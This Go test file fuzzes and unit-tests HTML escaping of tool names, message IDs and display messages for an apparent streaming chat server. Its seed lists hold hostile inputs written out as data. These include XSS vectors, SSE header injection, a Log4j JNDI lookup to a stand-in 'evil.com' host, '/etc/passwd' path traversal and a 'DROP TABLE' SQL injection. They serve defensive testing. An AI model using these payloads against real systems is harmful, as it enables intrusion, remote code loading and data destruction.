package handlers_test

import (
	"html"
	"strings"
	"testing"
	"unicode/utf8"
)

// =============================================================================
// Tool Event Emitter Fuzz Tests
// =============================================================================
//
// Security testing for XSS prevention in tool event messages.
// Per qa-master: All user-facing strings must be escaped before display.
//
// Test coverage:
// - FuzzToolNameEscape: Tool names from malicious input
// - FuzzMessageIDEscape: Message IDs from potentially untrusted sources
// - FuzzDisplayMessageEscape: Display messages for edge cases
//
// =============================================================================

// FuzzToolNameEscape tests HTML escaping of tool names.
// Tool names might come from external configuration or dynamic registration.
func FuzzToolNameEscape(f *testing.F) {
	// Seed corpus: 25+ XSS attack vectors per
	seeds := []string{
		// Basic XSS
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
		"<body onload=alert(1)>",

		// Event handler injection
		`" onclick="alert(1)"`,
		`' onclick='alert(1)'`,
		`<a href="javascript:alert(1)">`,
		`<input onfocus=alert(1) autofocus>`,

		// Protocol handlers
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"vbscript:alert(1)",

		// Encoding attacks
		"%3Cscript%3Ealert(1)%3C/script%3E",
		"&#60;script&#62;alert(1)&#60;/script&#62;",
		"\x3cscript\x3ealert(1)\x3c/script\x3e",

		// Unicode exploits
		"\u003cscript\u003ealert(1)\u003c/script\u003e",
		"\uFF1Cscript\uFF1E", // Fullwidth less-than/greater-than

		// Template injection (SSTI)
		"{{7*7}}",
		"${7*7}",
		"#{7*7}",
		"<%= 7*7 %>",

		// LDAP/Log4j style
		"${jndi:ldap://evil.com/a}",
		"${env:PATH}",

		// SSE-specific injection
		"event: malicious\ndata: payload",
		"data: <script>alert(1)</script>\n\n",
		"id: evil\nevent: chunk",

		// Null bytes and special chars
		"tool\x00name",
		"tool\nname",
		"tool\rname",

		// Unicode edge cases
		"\xef\xbb\xbf<script>", // BOM + script
		"\u200b<script>",       // Zero-width space
		"\u202e<script>",       // RTL override

		// Valid tool names (should pass through safely escaped)
		"web_search",
		"read_file",
		"execute_command",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Skip invalid UTF-8 (Go's html.EscapeString handles this)
		if !utf8.ValidString(input) {
			return
		}

		result := html.EscapeString(input)

		// CRITICAL: Escaped output must NOT contain raw HTML brackets
		if strings.Contains(result, "<") || strings.Contains(result, ">") {
			t.Errorf("raw HTML brackets in escaped output: %q -> %q", input, result)
		}

		// CRITICAL: Must not contain unescaped quotes
		if strings.Contains(result, `"`) && strings.Contains(input, `"`) {
			t.Errorf("raw double quotes in escaped output: %q -> %q", input, result)
		}

		// CRITICAL: Input with dangerous chars MUST be escaped
		hasDangerous := strings.ContainsAny(input, "<>&\"'")
		if hasDangerous && result == input {
			t.Errorf("dangerous input was not escaped: %q", input)
		}

		// Output should be non-empty for non-empty input
		if input != "" && result == "" {
			t.Errorf("empty result for non-empty input: %q", input)
		}

		// SSE injection check: no unescaped newlines in result
		// (newlines should be preserved but < > & should be escaped)
		if strings.Contains(result, "\n") && strings.Contains(result, "<") {
			t.Errorf("potential SSE injection: newline with unescaped HTML: %q", result)
		}
	})
}

// FuzzMessageIDEscape tests HTML escaping of message IDs.
// Message IDs are generated server-side but validated for safety.
func FuzzMessageIDEscape(f *testing.F) {
	// Seed corpus for message ID patterns
	seeds := []string{
		// Valid message IDs
		"msg-12345",
		"1702345678901234567",
		"assistant-1702345678901234567",

		// XSS in message ID
		"<script>alert(1)</script>",
		`msg-" onclick="alert(1)"`,
		"msg-\"><script>alert(1)</script>",

		// Template injection in ID
		"msg-{{.ID}}",
		"msg-${id}",

		// SSE injection
		"msg\nevent: malicious",
		"msg\r\ndata: evil",

		// Path traversal (should be escaped)
		"../../../etc/passwd",
		"msg/../../../tmp",

		// SQL injection (should be escaped)
		"msg'; DROP TABLE messages;--",
		"msg\" OR \"1\"=\"1",

		// Unicode edge cases
		"msg-\u0000",
		"msg-\u200b",
		"msg-\ufeff",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, input string) {
		if !utf8.ValidString(input) {
			return
		}

		result := html.EscapeString(input)

		// No raw HTML in output
		if strings.Contains(result, "<") || strings.Contains(result, ">") {
			t.Errorf("raw HTML in escaped message ID: %q -> %q", input, result)
		}

		// No raw quotes (breaks HTML attributes)
		if strings.Contains(result, `"`) && strings.Contains(input, `"`) {
			t.Errorf("raw quotes in escaped message ID: %q -> %q", input, result)
		}
	})
}

// FuzzDisplayMessageEscape tests HTML escaping of display messages.
// Display messages are from tool_display.go but could be extended.
func FuzzDisplayMessageEscape(f *testing.F) {
	// Seed corpus including Chinese characters (target user base)
	seeds := []string{
		// Valid display messages (Chinese)
		"搜尋網路中...",
		"搜尋完成",
		"執行命令中...",
		"已讀取檔案",

		// XSS in Chinese context
		"<script>搜尋</script>",
		"執行<img src=x onerror=alert(1)>完成",

		// Mixed content
		"Processing <b>bold</b> text",
		"Error: <code>undefined</code>",

		// Emoji (valid in display)
		"✅ 完成",
		"❌ 失敗",
		"🔍 搜尋中...",

		// Long messages
		strings.Repeat("搜尋中", 1000),
		strings.Repeat("<script>", 100),
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, input string) {
		if !utf8.ValidString(input) {
			return
		}

		result := html.EscapeString(input)

		// No raw HTML
		if strings.Contains(result, "<") || strings.Contains(result, ">") {
			t.Errorf("raw HTML in display message: %q -> %q", input, result)
		}

		// Chinese characters should be preserved
		for _, r := range input {
			if r >= 0x4E00 && r <= 0x9FFF { // CJK range
				if !strings.ContainsRune(result, r) {
					t.Errorf("Chinese character lost in escaping: %c", r)
				}
			}
		}
	})
}

// =============================================================================
// Unit Tests for Tool Emitter XSS Prevention
// =============================================================================

func TestToolEmitter_XSSPrevention(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name       string
		input      string
		wantEscape bool // Should be different from input
	}{
		{
			name:       "basic script tag",
			input:      "<script>alert('xss')</script>",
			wantEscape: true,
		},
		{
			name:       "img onerror",
			input:      `<img src=x onerror="alert(1)">`,
			wantEscape: true,
		},
		{
			name:       "svg onload",
			input:      `<svg/onload=alert(1)>`,
			wantEscape: true,
		},
		{
			name:       "javascript protocol",
			input:      `<a href="javascript:alert(1)">click</a>`,
			wantEscape: true,
		},
		{
			name:       "event handler injection",
			input:      `" onclick="alert(1)"`,
			wantEscape: true,
		},
		{
			name:       "safe tool name",
			input:      "web_search",
			wantEscape: false,
		},
		{
			name:       "Chinese message",
			input:      "搜尋網路中...",
			wantEscape: false,
		},
		{
			name:       "SSE injection attempt",
			input:      "event: malicious\ndata: payload",
			wantEscape: false, // newlines are ok, only < > & " ' need escaping
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			result := html.EscapeString(tt.input)

			if tt.wantEscape {
				if result == tt.input {
					t.Errorf("expected input to be escaped, but got same: %q", result)
				}
				// Verify no raw HTML in result
				if strings.Contains(result, "<") || strings.Contains(result, ">") {
					t.Errorf("escaped result still contains HTML brackets: %q", result)
				}
			} else {
				// Safe input might still be same after escaping if no special chars
				if strings.ContainsAny(tt.input, "<>&\"'") && result == tt.input {
					t.Errorf("input with special chars was not escaped: %q", tt.input)
				}
			}
		})
	}
}

func TestToolEmitter_DoubleEscapePrevention(t *testing.T) {
	t.Parallel()

	// Ensure we don't double-escape
	tests := []struct {
		name  string
		input string
	}{
		{"already escaped", "&lt;script&gt;"},
		{"ampersand", "&amp;"},
		{"mixed", "Hello &lt;World&gt;"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			// Double escape
			result := html.EscapeString(html.EscapeString(tt.input))

			// Should contain double-escaped entities
			if strings.Contains(tt.input, "&") {
				if !strings.Contains(result, "&amp;") {
					t.Errorf("expected double-escaped ampersand in: %q", result)
				}
			}
		})
	}
}
